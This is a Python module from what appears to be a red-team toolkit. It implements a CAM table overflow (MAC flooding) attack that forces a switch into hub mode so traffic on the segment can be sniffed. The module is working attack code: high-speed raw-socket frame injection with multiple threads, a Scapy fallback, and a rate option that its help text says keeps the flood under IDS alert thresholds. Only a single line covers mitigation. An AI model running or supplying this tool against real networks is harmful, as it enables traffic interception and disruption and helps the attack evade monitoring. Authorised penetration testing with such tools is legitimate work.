"""
cam — CAM Table Overflow / MAC Flooding
ATT&CK: T1499

Floods the switch with frames bearing random source MACs to exhaust the
CAM table. Fail-open switches then flood all traffic out every port in
the VLAN (hub mode), enabling passive sniffing.

Red team upgrades vs baseline:
  - AF_PACKET raw socket injection (80-500k fps vs 5k with Scapy).
  - Multi-threaded writers (--threads).
  - --rate throttle to stay under switch rate-limit thresholds.
    Recommended: --rate 10000 on monitored segments.
  - Falls back to Scapy if not running on Linux.

Effectiveness checklist (run preflight first):
  [OK]  Unmanaged / SOHO switch — full effect.
  [!]   Port Security (maximum N) — first fake MAC triggers err-disabled.
        Check: sh port-security int gi0/1 on Cisco.
  [!]   Catalyst Smart Port macro applied — usually enables port-security.

Mitigation: switchport port-security maximum <N>; violation shutdown.
"""

import platform
import time

NAME        = "cam"
DESCRIPTION = "CAM table overflow via raw socket (wire-speed) — enables passive sniff"
ATTCK_ID    = "T1499"


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                               description=__doc__)
    p.add_argument("-i", "--iface",   required=True, help="Interface, e.g. eth0")
    p.add_argument("-c", "--count",   type=int, default=50_000,
                   help="Total frames to send (default 50000)")
    p.add_argument("--threads", type=int, default=4,
                   help="Parallel sender threads (default 4, Linux only)")
    p.add_argument("--rate",    type=float, default=0,
                   help="Rate limit frames/sec (0 = wire speed). "
                        "Use ~10000 to avoid threshold-based IDS alerts.")
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    from core.common import require_root
    require_root()

    logger.info("CAM overflow | iface=%s count=%d threads=%d rate=%s fps",
                args.iface, args.count, args.threads,
                f"{args.rate:.0f}" if args.rate else "unlimited")

    last_log = [0]

    def progress(sent, total):
        if sent - last_log[0] >= 5_000:
            logger.info("Sent %d / %d frames", sent, total)
            last_log[0] = sent

    if platform.system() == "Linux":
        # Fast path: AF_PACKET raw socket
        try:
            from core.rawsock import flood
            t0 = time.time()
            total = flood(
                args.iface, args.count,
                threads=args.threads,
                rate_pps=args.rate,
                progress_cb=progress,
            )
            elapsed = time.time() - t0
            logger.info(
                "CAM overflow complete | sent=%d elapsed=%.1fs throughput=%.0f fps",
                total, elapsed, total / elapsed if elapsed > 0 else 0,
            )
            return 0
        except OSError as exc:
            logger.error("Raw socket error: %s", exc)
            return 1
    else:
        # Fallback: Scapy (slower, cross-platform)
        logger.warning(
            "Non-Linux platform detected — falling back to Scapy "
            "(expect ~5k fps instead of ~300k fps)."
        )
        from scapy.all import Ether, IP, RandIP, RandMAC, sendp
        batch = 2_000
        sent = 0
        try:
            while sent < args.count:
                n = min(batch, args.count - sent)
                frames = [Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP())
                          for _ in range(n)]
                sendp(frames, iface=args.iface, verbose=False)
                sent += n
                logger.info("Sent %d / %d frames", sent, args.count)
        except KeyboardInterrupt:
            logger.info("Stopped early. sent=%d", sent)
        return 0
